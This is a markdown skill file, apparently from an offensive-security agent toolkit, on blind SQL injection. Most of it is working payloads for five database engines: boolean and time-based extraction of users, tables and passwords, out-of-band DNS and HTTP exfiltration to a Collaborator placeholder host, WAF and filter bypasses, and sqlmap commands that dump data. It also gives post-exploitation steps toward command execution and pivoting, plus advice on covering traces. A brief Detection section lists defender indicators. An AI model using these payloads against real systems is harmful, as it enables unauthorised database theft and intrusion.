---
name: sql-injection-blind
description: "Extract data via boolean-based and time-based blind SQL injection when no direct output is available"
category: web
tools: [sqlmap, burpsuite]
opsec: medium
references:
  - source: public-security-references
    path: SQL Injection/MySQL Injection.md
  - source: public-security-references
    path: SQL Injection/MSSQL Injection.md
  - source: public-security-references
    path: SQL Injection/PostgreSQL Injection.md
  - source: public-security-references
    path: SQL Injection/OracleSQL Injection.md
  - source: public-security-references
    path: SQL Injection/SQLite Injection.md
  - source: public-security-references
    path: SQL Injection/DB2 Injection.md
  - source: public-security-references
    path: src/pentesting-web/sql-injection/README.md
---

# SQL Injection — Blind (Boolean & Time-Based)

<skill-name>sql-injection-blind</skill-name>

Extract data one bit/character at a time by asking true/false questions (boolean) or by measuring response delays (time-based). Use when the application does not display query results or error messages. Blind SQLi is slower than union or error-based but works in the most restrictive conditions.

## Prerequisites

- Confirmed SQL injection point (see **web-vuln-discovery**)
- No query output rendered in the response (otherwise use **sql-injection-union**)
- No verbose errors displayed (otherwise use **sql-injection-error**)
- For boolean: a detectable difference between true and false conditions (content change, status code, response size)
- For time-based: ability to measure response time (network must be stable enough to detect delays)

## Enumeration

### Confirm Boolean-Based Blind

Inject conditions that produce different responses for true vs false:

```sql
-- TRUE condition — page should render normally
' AND 1=1--+

-- FALSE condition — page should change (missing content, error, redirect)
' AND 1=2--+
```

Compare the two responses. Look for differences in:
- Response body content
- Response size (Content-Length)
- HTTP status code
- Presence/absence of specific elements

### Confirm Time-Based Blind

Inject a sleep function and measure the response delay:

```sql
-- MySQL: should delay 5 seconds
' AND SLEEP(5)--+
' AND IF(1=1,SLEEP(5),0)--+

-- MSSQL: should delay 5 seconds
'; WAITFOR DELAY '0:0:5'--+
' AND IF(1=1) WAITFOR DELAY '0:0:5'--+

-- PostgreSQL: should delay 5 seconds
'; SELECT pg_sleep(5)--+
' AND 1=(SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)--+

-- Oracle: should delay 5 seconds
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--+

-- SQLite: should delay noticeably (heavy computation)
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--+
```

If the response is delayed by ~5 seconds, time-based blind is confirmed.

## Exploitation — Boolean-Based

The pattern: ask "is the Nth character of [data] equal to X?" and observe the response.

### MySQL

```sql
-- Extract current user, character by character
-- Check length first
' AND LENGTH(user())=N--+

-- Extract character at position 1 (binary search is faster than linear)
' AND ASCII(SUBSTRING(user(),1,1))>78--+    -- Is it > 'N'?
' AND ASCII(SUBSTRING(user(),1,1))>90--+    -- Is it > 'Z'?
' AND ASCII(SUBSTRING(user(),1,1))=114--+   -- Is it 'r'?

-- Extract character at position 2
' AND ASCII(SUBSTRING(user(),2,1))>78--+

-- Extract database name
' AND ASCII(SUBSTRING(database(),1,1))>78--+

-- Count tables in database
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=N--+

-- Extract table name character by character
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>78--+

-- Extract column name
' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='TARGET_TABLE' LIMIT 0,1),1,1))>78--+

-- Extract data
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>78--+
```

**Alternative comparison operators** (when ASCII/SUBSTRING are blocked):
```sql
-- LIKE operator
' AND (SELECT user()) LIKE 'r%'--+
' AND (SELECT user()) LIKE 'ro%'--+

-- REGEXP
' AND (SELECT user()) REGEXP '^r'--+

-- MID (alias for SUBSTRING)
' AND MID(user(),1,1)='r'--+

-- MAKE_SET
' AND MAKE_SET(1,user()) LIKE 'r%'--+
```

### MSSQL

```sql
-- Extract current user, char by char
' AND ASCII(SUBSTRING(SYSTEM_USER,1,1))>78--+

-- Extract database name
' AND ASCII(SUBSTRING(DB_NAME(),1,1))>78--+

-- Count databases
' AND (SELECT COUNT(*) FROM master..sysdatabases)=N--+

-- Extract database name (Nth database)
' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM master..sysdatabases WHERE name NOT IN (SELECT TOP 0 name FROM master..sysdatabases)),1,1))>78--+

-- Extract table name
' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1))>78--+

-- Extract data
' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>78--+
```

### PostgreSQL

```sql
-- Extract current user
' AND ASCII(SUBSTRING(current_user,1,1))>78--+

-- Extract database name
' AND ASCII(SUBSTRING(current_database(),1,1))>78--+

-- Extract table name
' AND ASCII(SUBSTRING((SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 1),1,1))>78--+

-- Extract data
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>78--+
```

### Oracle

```sql
-- Oracle uses SUBSTR instead of SUBSTRING
' AND ASCII(SUBSTR((SELECT user FROM dual),1,1))>78--+

-- Extract table name
' AND ASCII(SUBSTR((SELECT table_name FROM user_tables WHERE ROWNUM=1),1,1))>78--+

-- Extract data
' AND ASCII(SUBSTR((SELECT password FROM users WHERE ROWNUM=1),1,1))>78--+
```

### SQLite

```sql
-- Extract version
' AND UNICODE(SUBSTR(sqlite_version(),1,1))>50--+

-- Extract table name from sqlite_master
' AND UNICODE(SUBSTR((SELECT tbl_name FROM sqlite_master WHERE type='table' LIMIT 1),1,1))>78--+

-- Extract data
' AND UNICODE(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>78--+
```

## Exploitation — Time-Based

Same character-by-character approach, but use response delay instead of content differences.

### MySQL

```sql
-- Extract user, char by char with conditional sleep
' AND IF(ASCII(SUBSTRING(user(),1,1))>78,SLEEP(2),0)--+

-- Extract database
' AND IF(ASCII(SUBSTRING(database(),1,1))>78,SLEEP(2),0)--+

-- Extract table names
' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>78,SLEEP(2),0)--+

-- Extract data
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>78,SLEEP(2),0)--+
```

**BENCHMARK** alternative (MySQL 4/5):
```sql
' AND IF(ASCII(SUBSTRING(user(),1,1))>78,BENCHMARK(10000000,SHA1('test')),0)--+
```

### MSSQL

```sql
-- Conditional delay
' AND IF ASCII(SUBSTRING(SYSTEM_USER,1,1))>78 WAITFOR DELAY '0:0:2'--+

-- Using CASE
'; IF(ASCII(SUBSTRING(DB_NAME(),1,1))>78) WAITFOR DELAY '0:0:2'--+

-- Stacked query variant
'; IF (SELECT ASCII(SUBSTRING(SYSTEM_USER,1,1)))>78 WAITFOR DELAY '0:0:2'--+
```

### PostgreSQL

```sql
-- Conditional delay using CASE
' AND 1=(SELECT CASE WHEN ASCII(SUBSTRING(current_user,1,1))>78 THEN pg_sleep(2) ELSE pg_sleep(0) END)--+

-- Extract data
' AND 1=(SELECT CASE WHEN ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>78 THEN pg_sleep(2) ELSE pg_sleep(0) END)--+
```

### Oracle

```sql
-- Conditional delay using CASE with DBMS_PIPE
' AND 1=(SELECT CASE WHEN ASCII(SUBSTR(user,1,1))>78 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',2) ELSE 0 END FROM dual)--+

-- Extract data
' AND 1=(SELECT CASE WHEN ASCII(SUBSTR((SELECT password FROM users WHERE ROWNUM=1),1,1))>78 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',2) ELSE 0 END FROM dual)--+
```

## Exploitation — Out-of-Band (OOB)

When neither boolean nor time-based is reliable, exfiltrate data via DNS or HTTP callbacks.

### MySQL (requires FILE privilege)

```sql
-- DNS exfiltration via LOAD_FILE
' AND LOAD_FILE(CONCAT('\\\\',user(),'.COLLABORATOR.burpcollaborator.net\\share'))--+
```

### MSSQL

```sql
-- DNS exfiltration via xp_dirtree
'; EXEC master..xp_dirtree '\\'+SYSTEM_USER+'.COLLABORATOR.burpcollaborator.net\share'--+

-- DNS via fn_xe_file_target_read_file (requires VIEW SERVER STATE)
' AND 1=(SELECT fn_xe_file_target_read_file('C:\*.xel','\\'+DB_NAME()+'.COLLABORATOR.burpcollaborator.net\share',NULL,NULL))--+
```

### PostgreSQL

```sql
-- DNS via COPY TO PROGRAM
'; COPY (SELECT current_user) TO PROGRAM 'nslookup '||current_user||'.COLLABORATOR.burpcollaborator.net'--+
```

### Oracle

```sql
-- DNS via UTL_HTTP
' AND 1=UTL_HTTP.REQUEST('http://'||(SELECT user FROM dual)||'.COLLABORATOR.burpcollaborator.net/')--+

-- DNS via EXTRACTVALUE with external DTD
' AND 1=EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://COLLABORATOR.burpcollaborator.net/'||(SELECT user FROM dual)||'">%remote;]>'),'/l')--+
```

## Post-Exploitation

After extracting credentials or key data:

1. **Escalate technique** — if you found credentials for a higher-privilege DB user, reconnect and try **sql-injection-union** with stacked queries
2. **File operations** — check read/write capabilities for the confirmed DBMS
3. **Command execution** — MSSQL `xp_cmdshell`, PostgreSQL `COPY TO PROGRAM`, Oracle Java execution
4. **Pivot** — extracted credentials may work on other services

## Cleanup

- Blind SQLi is read-only — no database artifacts
- Time-based queries may appear in slow query logs — no way to clean remotely
- Clear proxy history of extracted data after documenting

## Detection

Defenders look for:
- High volume of similar requests with incremental changes (character extraction)
- `SLEEP`, `WAITFOR`, `pg_sleep`, `BENCHMARK` in parameters
- `ASCII`, `SUBSTRING`, `SUBSTR` patterns
- Requests with abnormally long response times
- DNS queries to unusual subdomains (OOB exfil)

## Troubleshooting

### Boolean Responses Are Inconsistent

- The application may have dynamic content. Identify a stable indicator:
  - Specific HTML element present only on "true"
  - Exact response size threshold
  - Specific keyword in the response
- In Burp Intruder, use "Grep - Match" to flag a specific string

### Time-Based Is Unreliable Due to Network Jitter

- Increase the delay: `SLEEP(5)` instead of `SLEEP(2)`
- Use multiple samples per character and take the median
- Switch to boolean-based if any detectable content difference exists
- Consider OOB if available

### WAF Blocking SLEEP/BENCHMARK

```sql
-- MySQL: heavy query instead of SLEEP
' AND IF(1=1,(SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C),0)--+

-- MSSQL: stacked WAITFOR (no semicolon needed)
' AND 1=1 WAITFOR DELAY '0:0:5'--+
```

### Filter Bypass — Blocked Keywords

```sql
-- SUBSTRING alternatives
MID(str,pos,len)          -- MySQL
SUBSTR(str,pos,len)       -- All
RIGHT(LEFT(str,pos),1)    -- Most
```

### Automated Extraction with sqlmap

```bash
# Boolean-based only
sqlmap -u "https://TARGET/page?id=1" --batch --technique=B --dbs

# Time-based only
sqlmap -u "https://TARGET/page?id=1" --batch --technique=T --dbs

# Both blind techniques
sqlmap -u "https://TARGET/page?id=1" --batch --technique=BT --dbs

# Increase time-based delay for unreliable networks
sqlmap -u "https://TARGET/page?id=1" --batch --technique=T --time-sec=5 --dbs

# Increase threads for faster extraction (boolean only)
sqlmap -u "https://TARGET/page?id=1" --batch --technique=B --threads=8 --dbs

# From Burp request file with specific parameter
sqlmap -r request.txt --batch --technique=BT -p "id" --dbs

# Dump data
sqlmap -r request.txt --batch --technique=BT -D TARGET_DB -T TARGET_TABLE --dump
```
